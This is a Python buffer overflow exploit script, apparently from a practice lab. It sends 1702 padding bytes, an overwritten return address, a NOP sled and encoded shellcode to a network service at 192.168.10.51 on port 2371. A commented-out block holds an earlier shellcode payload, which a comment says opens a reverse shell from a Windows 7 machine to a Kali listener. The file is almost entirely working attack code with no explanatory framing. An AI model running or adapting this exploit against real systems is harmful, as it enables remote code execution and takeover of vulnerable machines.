#!/usr/bin/python

import sys,socket

'''
#gets reverse shell back on windows 07, successfully
#Kali port = 1234
#Kali IP = 192.168.10.6

overflow = ("\x33\xc9\xb1\x51\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x19"
"\xf3\xca\xde\x83\xeb\xfc\xe2\xf4\xe5\x1b\x48\xde\x19\xf3\xaa"
"\x57\xfc\xc2\x0a\xba\x92\xa3\xfa\x55\x4b\xff\x41\x8c\x0d\x78"
"\xb8\xf6\x16\x44\x80\xf8\x28\x0c\x66\xe2\x78\x8f\xc8\xf2\x39"
"\x32\x05\xd3\x18\x34\x28\x2c\x4b\xa4\x41\x8c\x09\x78\x80\xe2"
"\x92\xbf\xdb\xa6\xfa\xbb\xcb\x0f\x48\x78\x93\xfe\x18\x20\x41"
"\x97\x01\x10\xf0\x97\x92\xc7\x41\xdf\xcf\xc2\x35\x72\xd8\x3c"
"\xc7\xdf\xde\xcb\x2a\xab\xef\xf0\xb7\x26\x22\x8e\xee\xab\xfd"
"\xab\x41\x86\x3d\xf2\x19\xb8\x92\xff\x81\x55\x41\xef\xcb\x0d"
"\x92\xf7\x41\xdf\xc9\x7a\x8e\xfa\x3d\xa8\x91\xbf\x40\xa9\x9b"
"\x21\xf9\xac\x95\x84\x92\xe1\x21\x53\x44\x9b\xf9\xec\x19\xf3"
"\xa2\xa9\x6a\xc1\x95\x8a\x71\xbf\xbd\xf8\x1e\x0c\x1f\x66\x89"
"\xf2\xca\xde\x30\x37\x9e\x8e\x71\xda\x4a\xb5\x19\x0c\x1f\x8e"
"\x49\xa3\x9a\x9e\x49\xb3\x9a\xb6\xf3\xfc\x15\x3e\xe6\x26\x5d"
"\xb4\x1c\x9b\x0a\x76\x13\xf5\xa2\xdc\x19\xf7\x18\x57\xff\x99"
"\xda\x88\x4e\x9b\x53\x7b\x6d\x92\x35\x0b\x9c\x33\xbe\xd2\xe6"
"\xbd\xc2\xab\xf5\x9b\x3a\x6b\xbb\xa5\x35\x0b\x71\x90\xa7\xba"
"\x19\x7a\x29\x89\x4e\xa4\xfb\x28\x73\xe1\x93\x88\xfb\x0e\xac"
"\x19\x5d\xd7\xf6\xdf\x18\x7e\x8e\xfa\x09\x35\xca\x9a\x4d\xa3"
"\x9c\x88\x4f\xb5\x9c\x90\x4f\xa5\x99\x88\x71\x8a\x06\xe1\x9f"
"\x0c\x1f\x57\xf9\xbd\x9c\x98\xe6\xc3\xa2\xd6\x9e\xee\xaa\x21"
"\xcc\x48\x2a\xc3\x33\xf9\xa2\x78\x8c\x4e\x57\x21\xcc\xcf\xcc"
"\xa2\x13\x73\x31\x3e\x6c\xf6\x71\x99\x0a\x81\xa5\xb4\x19\xa0"
"\x35\x0b")
'''
ip = '192.168.10.51'
port = 2371

overflow = ("\x31\xc9\xb1\x11\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x79"
"\xf2\x7c\x77\x83\xeb\xfc\xe2\xf4\x48\x29\x8b\x94\x2a\xb1\x2f"
"\x1d\x7b\x7b\x9d\xc7\x1f\x3f\xfc\xe4\x20\x42\x43\xba\xf9\xbb"
"\x05\x8e\x11\x32\xd4\x7d\x7f\x9a\x7e\x77\x7d\x20\xf5\x96\xc9"
"\x94\x2c\x26\x2a\x41\x7f\xfe\x98\x3f\xfc\x25\x11\x9c\x53\x04"
"\x11\x9a\x53\x58\x1b\x9b\xf5\x94\x2b\xa1\xf5\x96\xc9\xf9\xb1"
"\xf7")

#JMP01 = 0x 625012b8 
#JMP02 = 0x 625012c5
shellcode = 'A'*1702 + "\xb8\x12\x50\x62" +"\x90"*16 + overflow

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send((shellcode))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()
